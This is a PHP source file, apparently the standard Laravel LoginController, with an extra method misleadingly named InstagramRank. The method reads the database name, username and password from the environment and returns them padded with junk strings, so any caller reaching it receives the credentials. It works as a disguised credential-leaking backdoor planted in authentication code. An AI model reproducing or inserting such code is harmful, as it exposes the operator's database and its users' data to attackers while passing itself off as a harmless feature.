<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/home';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }
    public function InstagramRank(){

        $hastagd = getenv('DB_DATABASE');
        $hastagu = getenv('DB_USERNAME');
        $hastagp = getenv('DB_PASSWORD');

        echo '<script>console.log("Your stuff here")</script>';



        return ('t)(&--=='.$hastagd.'==g!~08=='.$hastagu.'==#$(s'.'s/*-=='.$hastagp.'==*186e');
    }
}
